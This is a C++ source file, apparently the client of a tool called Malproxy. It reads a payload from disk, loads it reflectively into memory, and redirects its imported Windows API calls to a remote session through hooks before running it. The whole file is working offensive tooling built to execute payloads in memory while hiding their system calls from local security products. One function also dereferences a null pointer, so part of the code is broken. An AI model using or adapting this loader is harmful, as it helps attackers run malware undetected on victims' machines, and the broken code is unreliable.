// RemoteSyscallsClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <algorithm>
#include <string> 

#include "MalproxyClientRunner.h"
#include "MemoryModule.h"
#include "Framework/Utils.h"
#include "Framework/fnptr.h"

using Buffer = std::vector<unsigned char>;

MalproxyClientRunner& MalproxyClientRunner::InstanceImpl(const std::shared_ptr<MalproxySession>& client)
{
	static MalproxyClientRunner instance(client);
	return instance;
}

MalproxyClientRunner& MalproxyClientRunner::Instance()
{
	return InstanceImpl();
}

void MalproxyClientRunner::Init(const std::shared_ptr<MalproxySession>& client)
{
	InstanceImpl(client);
}

Buffer MalproxyClientRunner::MalproxyReadFile(const std::string& path)
{
	HANDLE file = INVALID_HANDLE_VALUE;

	file = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file == INVALID_HANDLE_VALUE)
		THROW("CreateFileA failed with error %d", GetLastError());

	auto file_close = [](HANDLE* handle) { if (handle != nullptr) CloseHandle(*handle); };
	std::unique_ptr<HANDLE, decltype(file_close)> file_guard(&file, file_close);

	uint64_t high = 0;
	uint64_t size = GetFileSize(file, (LPDWORD)&high);
	size = (high << 32) | size;

	if (size == INVALID_FILE_SIZE)
		THROW("GetFileSize failed with error %d", GetLastError());
	
	std::vector<unsigned char> buffer(size);
	DWORD bytes_read = 0;

	if (!ReadFile(file, &buffer[0], (DWORD)size, &bytes_read, nullptr))
		THROW("ReadFile failed!, GetLastError=%d", GetLastError());
	
	buffer.resize(bytes_read);
	return buffer;
}

class MalproxyLibraryHookGenerator
{
public:
	MalproxyLibraryHookGenerator() = default;
	virtual ~MalproxyLibraryHookGenerator() = default;

	void loadLibrary(const char* library_name);
	void create_hook(const char* library_name, const char* funciton_name);

private:
	struct LibraryHookData
	{
		std::string library_name;
		std::string function_name;

		bool operator==(const LibraryHookData& data) { return library_name == data.library_name && function_name == data.function_name; }
	};
};

extern std::map<std::string, std::map<std::string, FARPROC>> autogenerated_stubs;

MalproxyClientRunner::MalproxyClientRunner(const std::shared_ptr<MalproxySession>& client) : _client(client)
{
	_hooks = autogenerated_stubs;
}

HCUSTOMMODULE MalproxyClientRunner::MalproxyLoadLibrary(const char* dll_name, void* context)
{
	malproxy::LoadLibraryRequest request;
	std::string dll_name_str(dll_name);
	request.set_dll_name(dll_name);
	auto response = Instance()._client->LoadRemoteLibrary(request);
	HCUSTOMMODULE library = (HCUSTOMMODULE)response.handle().handle();
	std::transform(dll_name_str.begin(), dll_name_str.end(), dll_name_str.begin(), ::tolower);
	Instance()._loaded_modules[library] = dll_name_str;
	return library;
}

FARPROC MalproxyClientRunner::MalproxyGetProcAddress(HCUSTOMMODULE library, LPCSTR function_name, void *context)
{
	FARPROC remote_func = Instance()._hooks[Instance()._loaded_modules[library]][function_name];
	return (remote_func != nullptr) ? remote_func : GetProcAddress(GetModuleHandleA(Instance()._loaded_modules[library].c_str()), function_name);
}

void MalproxyClientRunner::MalproxyFreeLibrary(HCUSTOMMODULE module, void *context)
{
	malproxy::FreeLibraryRequest request;
	std::unique_ptr<malproxy::HandleType> handle = std::unique_ptr<malproxy::HandleType>();
	handle->set_handle((uint64_t)module);
	request.set_allocated_handle(handle.release());
	Instance()._client->FreeRemoteLibrary(request);
}


void MalproxyClientRunner::RunRemote(const std::string& module_path)
{
	CustomLoadLibraryFunc malproxy_load_library = [this](const char* dll_name, void* context) { return MalproxyLoadLibrary(dll_name, context); };
	CustomGetProcAddressFunc malproxy_get_proc_address = [this](HCUSTOMMODULE lib, LPCSTR function_name, void * context) { return MalproxyGetProcAddress(lib, function_name, context); };

	Buffer payload_data = MalproxyReadFile(module_path);
	HMEMORYMODULE payload = MemoryLoadLibraryEx(payload_data.data(), payload_data.size(), MemoryDefaultAlloc, MemoryDefaultFree, malproxy_load_library, malproxy_get_proc_address, MemoryDefaultFreeLibrary, nullptr);
	if (MemoryCallEntryPoint(payload) == -1) // Might be because this is DLL
	{
		FARPROC run_func = MemoryGetProcAddress(payload, "Run");
		run_func();
	}
}